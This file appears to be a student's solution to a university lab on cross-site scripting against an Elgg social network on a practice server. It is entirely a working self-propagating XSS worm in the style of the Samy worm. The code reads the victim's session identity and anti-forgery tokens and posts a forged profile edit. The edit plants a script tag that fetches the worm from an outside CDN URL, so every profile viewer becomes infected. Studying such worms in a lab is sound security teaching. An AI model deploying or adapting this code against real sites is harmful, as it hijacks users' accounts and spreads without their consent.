window.onload = function(){
	//https://raw.githubusercontent.com/spiny-lumpsucker/cos-430/main/project03_task6_link3.js
	// var wormCode = encodeURIComponent(
	// 	"<script type=\"text/javascript\" " +
	// 	"id=\"worm\" " +
	// 	"src=\"https://cdn.jsdelivr.net/gh/spiny-lumpsucker/cos-430/main/project03_task6_link3.js\">" +
	// 	"</" + "script>");

  var wormCode = encodeURIComponent("<script type=\"text/javascript\" id=\"worm\" src=\"https://cdn.jsdelivr.net/gh/spiny-lumpsucker/cos-430/main/project03_task6_link3.js\"></script>");
	
	// Set the content for the description field
	var desc ="&description=I love Samy" + wormCode + "&accesslevel[description]=2";

	//rest of the code is the same as that in the previous approach...
	// Get the name, guid, timestamp, and token
	var name  = "&name=" + elgg.session.user.name;
	var guid  = "&guid=" + elgg.session.user.guid;
	var ts    = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
	var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
	
	// Set the URL
	var sendurl="http://www.seed-server.com/action/profile/edit";
	var content = token + ts + name + desc + guid;
  var samyguid = 59;
	
	// Construct and send the Ajax request
	if (elgg.session.user.guid!=samyguid) {
		//create and send Ajax request to modify profile
		Ajax = new XMLHttpRequest();
		Ajax.open ("POST", sendurl, true);
		Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		Ajax.send(content);
	}	
}
